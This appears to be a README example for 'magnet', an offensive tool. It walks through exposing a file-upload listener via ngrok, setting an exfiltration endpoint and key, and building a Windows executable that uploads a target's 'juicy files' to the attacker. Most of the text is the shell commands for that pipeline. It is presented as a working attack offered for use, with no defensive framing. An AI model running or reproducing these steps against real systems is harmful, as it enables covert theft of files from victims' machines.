# Example

Below is a complete example of `magnet` usage

## Pre-requisites
* [`gitar`](https://github.com/ariary/gitar) but you could use the HTTP server of your choice, as long as file upload is possible
* [`ngrok`](https://ngrok.com/)
* [`lobfuscator`](https://github.com/ariary/magnet/blob/main/README.md#build-lobfuscator)
* Clone `magnet` repository and go inside it

Our target run a windows device

## 1. Set up attacker listener

Using 
```shell
## Launch HTTP Upload server
gitar -e 127.0.0.1
## Expose the server using
ngrok http 9237 #copy ngrok endpoint
```

## 2. Set environment variables
```shell
TARGET_OS=windows
FILES=samples/windows_juicy_files.txt
ENDPOINT=[NGROK_HTTPS_ENDPOINT]/[GITAR_RANDOM_PATH]/push
KEY=thisismytestkey
```

## 3. Build malicious executable
```shell
./build.sh $TARGET_OS $FILES $ENDPOINT $KEY
#build magnet.exe
```

## 4. Watch the magic happen

Transfer the executable on windows machine and observe.

On gitar listener you should receive the files
